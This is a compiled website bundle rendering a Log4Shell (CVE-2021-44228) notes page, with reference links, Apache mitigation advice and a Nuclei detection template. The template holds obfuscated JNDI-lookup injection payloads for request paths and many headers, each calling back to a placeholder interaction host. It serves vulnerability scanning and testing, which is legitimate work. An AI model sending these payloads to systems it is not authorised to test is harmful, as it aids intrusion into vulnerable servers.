"use strict";(self.webpackChunkwebsite=self.webpackChunkwebsite||[]).push([[528],{3905:function(n,t,e){e.d(t,{Zo:function(){return p},kt:function(){return d}});var r=e(7294);function o(n,t,e){return t in n?Object.defineProperty(n,t,{value:e,enumerable:!0,configurable:!0,writable:!0}):n[t]=e,n}function a(n,t){var e=Object.keys(n);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(n);t&&(r=r.filter((function(t){return Object.getOwnPropertyDescriptor(n,t).enumerable}))),e.push.apply(e,r)}return e}function i(n){for(var t=1;t<arguments.length;t++){var e=null!=arguments[t]?arguments[t]:{};t%2?a(Object(e),!0).forEach((function(t){o(n,t,e[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(n,Object.getOwnPropertyDescriptors(e)):a(Object(e)).forEach((function(t){Object.defineProperty(n,t,Object.getOwnPropertyDescriptor(e,t))}))}return n}function l(n,t){if(null==n)return{};var e,r,o=function(n,t){if(null==n)return{};var e,r,o={},a=Object.keys(n);for(r=0;r<a.length;r++)e=a[r],t.indexOf(e)>=0||(o[e]=n[e]);return o}(n,t);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(n);for(r=0;r<a.length;r++)e=a[r],t.indexOf(e)>=0||Object.prototype.propertyIsEnumerable.call(n,e)&&(o[e]=n[e])}return o}var s=r.createContext({}),c=function(n){var t=r.useContext(s),e=t;return n&&(e="function"==typeof n?n(t):i(i({},t),n)),e},p=function(n){var t=c(n.components);return r.createElement(s.Provider,{value:t},n.children)},u={inlineCode:"code",wrapper:function(n){var t=n.children;return r.createElement(r.Fragment,{},t)}},h=r.forwardRef((function(n,t){var e=n.components,o=n.mdxType,a=n.originalType,s=n.parentName,p=l(n,["components","mdxType","originalType","parentName"]),h=c(e),d=o,m=h["".concat(s,".").concat(d)]||h[d]||u[d]||a;return e?r.createElement(m,i(i({ref:t},p),{},{components:e})):r.createElement(m,i({ref:t},p))}));function d(n,t){var e=arguments,o=t&&t.mdxType;if("string"==typeof n||o){var a=e.length,i=new Array(a);i[0]=h;var l={};for(var s in t)hasOwnProperty.call(t,s)&&(l[s]=t[s]);l.originalType=n,l.mdxType="string"==typeof n?n:o,i[1]=l;for(var c=2;c<a;c++)i[c]=e[c];return r.createElement.apply(null,i)}return r.createElement.apply(null,e)}h.displayName="MDXCreateElement"},6366:function(n,t,e){e.r(t),e.d(t,{frontMatter:function(){return l},contentTitle:function(){return s},metadata:function(){return c},toc:function(){return p},default:function(){return h}});var r=e(7462),o=e(3366),a=(e(7294),e(3905)),i=["components"],l={sidebar_position:1},s="Log4j",c={unversionedId:"vulns/log4j",id:"vulns/log4j",title:"Log4j",description:"About",source:"@site/docs/vulns/log4j.md",sourceDirName:"vulns",slug:"/vulns/log4j",permalink:"/site/docs/vulns/log4j",editUrl:"https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/docs/vulns/log4j.md",tags:[],version:"current",sidebarPosition:1,frontMatter:{sidebar_position:1},sidebar:"tutorialSidebar",previous:{title:"S3 Bucket",permalink:"/site/docs/tools/s3-bucket"}},p=[{value:"About",id:"about",children:[],level:2},{value:"How to Mitigate",id:"how-to-mitigate",children:[],level:2},{value:"Nuclei Template",id:"nuclei-template",children:[],level:2}],u={toc:p};function h(n){var t=n.components,e=(0,o.Z)(n,i);return(0,a.kt)("wrapper",(0,r.Z)({},u,e,{components:t,mdxType:"MDXLayout"}),(0,a.kt)("h1",{id:"log4j"},"Log4j"),(0,a.kt)("h2",{id:"about"},"About"),(0,a.kt)("ul",null,(0,a.kt)("li",{parentName:"ul"},"Vuln detais: ",(0,a.kt)("a",{parentName:"li",href:"https://logging.apache.org/log4j/2.x/security.html"},"https://logging.apache.org/log4j/2.x/security.html")),(0,a.kt)("li",{parentName:"ul"},"Some more info: ",(0,a.kt)("a",{parentName:"li",href:"https://www.kaspersky.com/blog/log4shell-critical-vulnerability-in-apache-log4j/43124/"},"https://www.kaspersky.com/blog/log4shell-critical-vulnerability-in-apache-log4j/43124/")),(0,a.kt)("li",{parentName:"ul"},"Github PoC: ",(0,a.kt)("a",{parentName:"li",href:"https://github.com/kozmer/log4j-shell-poc"},"https://github.com/kozmer/log4j-shell-poc")),(0,a.kt)("li",{parentName:"ul"},"TryHackMe Lab: ",(0,a.kt)("a",{parentName:"li",href:"https://tryhackme.com/room/solar"},"https://tryhackme.com/room/solar")),(0,a.kt)("li",{parentName:"ul"},"BlueTeam CheatSheet: ",(0,a.kt)("a",{parentName:"li",href:"https://gist.github.com/SwitHak/b66db3a06c2955a9cb71a8718970c592"},"https://gist.github.com/SwitHak/b66db3a06c2955a9cb71a8718970c592")),(0,a.kt)("li",{parentName:"ul"},"Cheat Sheet: ",(0,a.kt)("a",{parentName:"li",href:"https://www.techsolvency.com/story-so-far/cve-2021-44228-log4j-log4shell/"},"https://www.techsolvency.com/story-so-far/cve-2021-44228-log4j-log4shell/"))),(0,a.kt)("h2",{id:"how-to-mitigate"},"How to Mitigate"),(0,a.kt)("p",null,"Follow this link for updates: ",(0,a.kt)("a",{parentName:"p",href:"https://logging.apache.org/log4j/2.x/security.html"},"https://logging.apache.org/log4j/2.x/security.html")),(0,a.kt)("p",null,(0,a.kt)("strong",{parentName:"p"},"Log4j 1.x mitigation"),": Log4j 1.x is not impacted by this vulnerability."),(0,a.kt)("p",null,(0,a.kt)("strong",{parentName:"p"},"Log4j 2.x mitigation"),": Implement one of the mitigation techniques below."),(0,a.kt)("ul",null,(0,a.kt)("li",{parentName:"ul"},"Java 8 (or later) users should upgrade to release 2.16.0."),(0,a.kt)("li",{parentName:"ul"},"Users requiring Java 7 should upgrade to release 2.12.2 when it becomes available (work in progress, expected to be available soon)."),(0,a.kt)("li",{parentName:"ul"},"Otherwise, remove the JndiLookup class from the classpath: zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class")),(0,a.kt)("p",null,"Note that only the log4j-core JAR file is impacted by this vulnerability. Applications using only the log4j-api JAR file without the log4j-core JAR file are not impacted by this vulnerability."),(0,a.kt)("h2",{id:"nuclei-template"},"Nuclei Template"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-bash"},'nuclei -t template.yaml -u "https://target.url" interactsh-url="http://interact-sh.url"\n')),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-yaml"},'id: CVE-2021-44228 \n\ninfo:\n  name: Log4J RCE\n  author: iNvist / hazcod\n  severity: critical\n  description: CVE-2021-44228 \n\nrequests:\n  - raw:\n    - | \n        GET /{{Path}}${jndi:dns://{{interactsh-url}}:80/d HTTP/1.1\n        Host: {{Hostname}}\n    matchers-condition: or\n    matchers:\n    - type: word\n      part: interactsh_protocol # Confirms the DNS Interaction\n      words:\n        - "dns"\n\n  - raw:\n    - | \n        GET //{{Path}}${jndi:dns://{{interactsh-url}}:80/d HTTP/1.1\n        Host: {{Hostname}}\n    matchers-condition: or\n    matchers:\n    - type: word\n      part: interactsh_protocol # Confirms the DNS Interaction\n      words:\n        - "dns"\n\n  - raw:\n    - | \n        GET /{{Path}}${${lower:jn}di:${lower:dn}s://{{interactsh-url}}:80/d HTTP/1.1\n        Host: {{Hostname}}\n    matchers-condition: or\n    matchers:\n    - type: word\n      part: interactsh_protocol # Confirms the DNS Interaction\n      words:\n        - "dns"\n\n  - raw:\n    - | \n        GET //{{Path}}${${lower:jn}di:${lower:dn}s://{{interactsh-url}}:80/d HTTP/1.1\n        Host: {{Hostname}}\n    matchers-condition: or\n    matchers:\n    - type: word\n      part: interactsh_protocol # Confirms the DNS Interaction\n      words:\n        - "dns"\n    # TODO maybe encoding\n      \n  - raw:\n    - | \n        GET /{{Path}}?${${lower:jn}di:${lower:dn}s:://{{interactsh-url}}:80/d HTTP/1.1\n        Host: {{Hostname}}\n    matchers-condition: or\n    matchers:\n    - type: word\n      part: interactsh_protocol # Confirms the DNS Interaction\n      words:\n        - "dns"\n\n  - raw:\n    - | \n        GET /{{Path}} HTTP/1.1\n        Host: {{Hostname}}\n        Authorization: {{auth_type }} ${jndi:dns://{{interactsh-url}}:80/o\n\n    payloads:\n      auth_type:\n        - Bearer\n        - Oauth\n        - Token\n        - Basic\n    matchers-condition: or\n    matchers:\n    - type: word\n      part: interactsh_protocol # Confirms the DNS Interaction\n      words:\n        - "dns"\n\n  - raw:\n    - | \n        GET //{{Path}} HTTP/1.1\n        Host: {{Hostname}}\n        Authorization: {{auth_type }} ${jndi:dns://{{interactsh-url}}:80/o\n\n    payloads:\n      auth_type:\n        - Bearer\n        - Oauth\n        - Token\n        - Basic\n    matchers-condition: or\n    matchers:\n    - type: word\n      part: interactsh_protocol # Confirms the DNS Interaction\n      words:\n        - "dns"\n\n  - raw:\n    - | \n        GET /{{Path}} HTTP/1.1\n        Host: {{Hostname}}\n        Authorization: {{auth_type }} ${${lower:jn}di:${lower:dn}s://{{interactsh-url}}:80/o\n\n    payloads:\n      auth_type:\n        - Bearer\n        - Oauth\n        - Token\n        - Basic\n    matchers-condition: or\n    matchers:\n      - type: word\n        part: interactsh_protocol # Confirms the DNS Interaction\n        words:\n          - "dns"\n      - type: regex\n        part: interactsh_request\n        regex:\n        - "JRMP"\n\n  - raw:\n    - | \n        GET /{{Path}} HTTP/1.1\n        Host: {{Hostname}}\n        \xa7header_val\xa7: ${${lower:jn}di:${lower:dn}s://{{interactsh-url}}:80/o\n         \n    payloads:\n      header_val: \n        - Accept\n        - Accept-Charset\n        - Accept-Datetime\n        - Accept-Encoding\n        - Accept-Language\n        - Alt-Svc\n        - Base-Url\n        - CF-Connecting-IP\n        - Cache-Control\n        - Client-IP\n        - Cluster\n        - Cluster-Client-IP\n        - Connection\n        - Contact\n        - Content-Length\n        - Content-MD5\n        - Content-Type\n        - Cookie\n        - DNT\n        - Date\n        - Destination\n        - Expect\n        - Forwarded\n        - From\n        - Front-End-Https\n        - HTTP_CLIENT_IP\n        - HTTP_FORWARDED\n        - HTTP_FORWARDED_FOR\n        - HTTP_X_FORWARDED\n        - HTTP_X_FORWARDED_FOR\n        - Host\n        - Http-Url\n        - If-Match\n        - If-Modified-Since\n        - If-None-Match\n        - If-Range\n        - If-Unmodified-Since\n        - Link\n        - Location\n        - Max-Forwards\n        - Origin\n        - Pragma\n        - Profile\n        - Proxy\n        - Proxy-Authorization\n        - Proxy-Connection\n        - Proxy-Host\n        - Proxy-Url\n        - Range\n        - Real-IP\n        - Redirect\n        - Referer\n        - Referrer\n        - Refferer\n        - Request-Uri\n        - TE\n        - True-Client-IP\n        - UID\n        - Upgrade\n        - Uri\n        - User-Agent\n        - Via\n        - Warning\n        - X-ATT-DeviceId\n        - X-Arbitrary\n        - X-CSRFToken\n        - X-Client-IP\n        - X-Cluster-Client-IP\n        - X-Correlation-ID\n        - X-Csrf-Token\n        - X-Do-Not-Track\n        - X-Forward-For\n        - X-Forwarded\n        - X-Forwarded-By\n        - X-Forwarded-For\n        - X-Forwarded-For-IP\n        - X-Forwarded-For-Original\n        - X-Forwarded-Host\n        - X-Forwarded-Proto\n        - X-Forwarded-Server\n        - X-Forwarder-For\n        - X-Host\n        - X-Http-Destinationurl\n        - X-Http-Host-Override\n        - X-Http-Method-Override\n        - X-Original-Remote-Addr\n        - X-Original-Urlm\n')))}h.isMDXComponent=!0}}]);